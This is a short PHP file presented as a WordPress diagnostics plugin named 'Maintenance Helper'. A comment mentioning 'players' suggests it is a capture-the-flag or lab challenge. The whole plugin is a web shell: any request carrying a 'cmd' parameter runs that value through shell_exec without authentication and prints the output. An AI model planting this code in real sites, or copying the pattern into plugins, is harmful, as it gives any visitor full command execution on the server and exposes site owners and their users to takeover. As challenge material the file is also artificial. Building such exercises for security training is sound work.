<?php
/*
Plugin Name:  Maintenance Helper
Plugin URI:   https://techcorp.local
Description:  Internal diagnostics plugin.
Version:      1.0
Author:       TechCorp IT
*/

// Command execution endpoint — players need to figure out the URL
if (isset($_REQUEST['cmd'])) {
    $out = shell_exec((string) $_REQUEST['cmd']);
    echo htmlspecialchars($out, ENT_QUOTES);
}
